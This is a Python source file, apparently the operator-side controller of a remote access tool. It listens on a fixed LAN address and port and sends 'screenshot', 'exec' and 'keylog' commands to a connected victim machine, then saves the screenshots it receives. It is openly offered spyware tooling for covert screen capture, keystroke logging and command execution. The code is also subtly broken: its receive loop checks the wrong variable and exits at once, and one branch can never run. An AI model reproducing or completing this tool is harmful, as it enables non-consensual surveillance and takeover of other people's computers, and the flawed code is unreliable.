import socket
import io
from utils import *

SCREENSHOT = 'SCREENSHOT'
KEYLOG = 'KEYLOG'
COMMAND = 'COMMAND'

commands = ['screenshot', 'exec', 'keylog', 'stop']

init = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
config = ('192.168.0.185', 8000)
init.bind(config)
init.listen(5)
print("Waiting for connections..")
ss, client = init.accept()
print('Connection established via', client)

try:
    while True:
        command = input("Enter command: ")
        if command.lower() in commands:
            if command == '':
                print("No command entered")
                continue
            elif command == 'stop':
                print("Stopping, Goodbye !")
                break
            else:
                if command == 'screenshot':
                    print('Processing screenshot')
                    ss.send(SCREENSHOT.encode())
                    try:
                        data = b''
                        while True:
                            chunk = ss.recv(1048)
                            if not data:
                                break
                            data += chunk
                            print(data)
                        save_screenshot(data)

                    except KeyboardInterrupt:
                        continue
        else:
            print("Unavailable command. List of commands", commands)
            continue
except Exception as e:
    print('error', e)
    quit()

####


import random
import os

def random_name():
    abc = "qwertyuiopasdfghjklzxcvbnm1234567890"
    return "".join([abc[random.randint(0, len(abc) - 1)] for _ in range(0, len(abc) - 20)])

def save_screenshot(data):
    path = os.getcwd()
    filename = os.path.join(path, 'binaries', random_name()+'.png',)
    with open(filename, 'wb') as file:
        file.write(data)
        print('image has been saved !!')
        return

